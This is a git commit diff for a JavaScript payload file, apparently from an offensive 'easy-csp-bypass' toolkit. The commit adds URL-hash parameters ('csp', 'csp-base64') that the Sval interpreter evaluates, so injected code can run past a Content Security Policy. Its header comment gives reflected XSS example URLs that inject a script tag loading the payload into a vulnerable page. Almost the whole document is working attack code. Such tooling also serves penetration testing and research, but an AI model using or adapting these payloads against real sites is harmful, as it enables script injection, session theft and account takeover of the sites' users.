4c047630871b671a204eaa4a953c3e9bbe8e419a
siunam321 <siunam321atcybersec@gmail.com>
2026-02-16 20:42:21 +0800

    Added support for URL hash eval

--- src/payloads/sval-url.js
+++ src/payloads/sval-url.js
@@ -1,11 +1,17 @@
 /*
-	Reflected XSS scenario where you are size limited.
+    Reflected XSS scenario where you are size limited.
 
-	This will look for the GET parameter "CSP" and evaluate it.
+    This will look for the GET parameter "CSP" and evaluate it.
 
-	Example:
-	- http://vulnerable.com/?csp=alert('1')&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
-	- http://vulnerable.com/?csp-base64=YWxlcnQoMSk7&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
+    Example:
+    - http://vulnerable.com/?csp=alert('1')&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
+    - http://vulnerable.com/?csp-base64=YWxlcnQoMSk7&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
+
+    It also supports the same parameters in the URL hash, which can be useful if the URL's query parameter is being filtered for certain characters.
+    
+    Example:
+    - http://vulnerable.com/#csp=alert('1')&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
+    - http://vulnerable.com/#csp-base64=YWxlcnQoMSk7&search=<script src="//cdn.js/..../easy-csp-bypass/dist/sval-url.js"></script>
 */
 import Sval from 'sval'
 
@@ -17,10 +23,21 @@ const options = {
 const interpreter = new Sval(options)
 
 window.addEventListener("load", () => {
-	const urlParams = new URLSearchParams(window.location.search);
-	let csp = urlParams.get('csp');
-	if (csp) interpreter.run(csp)
+    const hash = window.location.hash.substring(1);
+    const hashParams = new URLSearchParams(hash);
+    if (hashParams.has('csp') || hashParams.has('csp-base64')) {
+        const hashCsp = hashParams.get('csp');
+        if (hashCsp) interpreter.run(hashCsp);
 
-	csp = urlParams.get('csp-base64');
-	if (csp) interpreter.run(atob(csp))
+        const hashCspBase64 = hashParams.get('csp-base64');
+        if (hashCspBase64) interpreter.run(atob(hashCspBase64));
+        return;
+    }
+
+    const urlParams = new URLSearchParams(window.location.search);
+    let csp = urlParams.get('csp');
+    if (csp) interpreter.run(csp)
+
+    csp = urlParams.get('csp-base64');
+    if (csp) interpreter.run(atob(csp))
 });
